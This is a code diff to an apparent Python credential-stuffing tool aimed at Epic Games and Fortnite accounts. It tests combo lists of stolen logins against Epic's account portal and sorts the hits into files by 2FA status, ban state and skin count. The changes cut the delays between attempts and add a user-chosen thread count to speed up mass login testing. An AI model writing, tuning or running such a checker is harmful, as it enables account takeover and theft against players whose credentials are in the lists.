@@ -314,11 +314,12 @@ def check(line):
             open(f'{folder}/2FA/all.txt', 'a',
             encoding='u8').write(f'{line}\n')
             checked += 1
-            time.sleep(0.1)
+            time.sleep(0.01)
             return
         elif 'errorCode":"errors.com.epicgames.accountportal.account_headless' in response.text:
             print(f'{red}[HEADLESS] - {white}{line}{rescolor}')
             checked +=1
+            time.sleep(0.01)
             return
         elif 'DATE_OF_BIRTH' in response.text or 'message":"No account was found to log you in' in response.text:
             print(f'{yellow}[XBOX] - {white}{line}{rescolor}')
@@ -636,6 +637,7 @@ def check(line):
                             if "Login is banned or does not posses the action 'PLAY'" in response_str or "numericErrorCode\" : 1023," in response_str or "messageVars\" : [ \"PLAY" in response_str or response.status_code == 403:
                                 print(f'{red}[FN-BAN] - {white}{line}')
                                 checked += 1
+                                time.sleep(0.001)
                                 return
 
                             if has_stw == 'YES':
@@ -886,6 +888,7 @@ def check(line):
                                 open(f'{folder}/Fortnite/300+Skins/All.txt', 'a',
                                 encoding='u8').write(f'{line}\n')
                             checked +=1
+                            time.sleep(0.01)
                             return
 
 def emails_extractor(combo_file):
@@ -925,7 +928,13 @@ def main():
         clean_accs = list(dict().fromkeys(accs))
         total_lines = len(clean_accs)
         print(f'Loaded {total_lines} Lines From: {combo}\n{rescolor}')
-        with ThreadPoolExecutor(max_workers=50) as executor:
+        try:
+            threads_number = int(input(f'{lgreen}[!] How Many Threads To Use (Recomended: 50): '))
+        except:
+            print(f'{red}[!] Invalid Input')
+            time.sleep(2)
+            exit()
+        with ThreadPoolExecutor(max_workers=threads_number) as executor:
             futures = {executor.submit(check, acc): acc for acc in clean_accs}
             for future in futures:
                 try:
@@ -935,7 +944,7 @@ def main():
 
         while True:
             if len(toomany) > 0:
-                with ThreadPoolExecutor(max_workers=50) as executor:
+                with ThreadPoolExecutor(max_workers=threads_number) as executor:
                     futures = {executor.submit(check, acc): acc for acc in toomany}
                     for future in futures:
                         try:
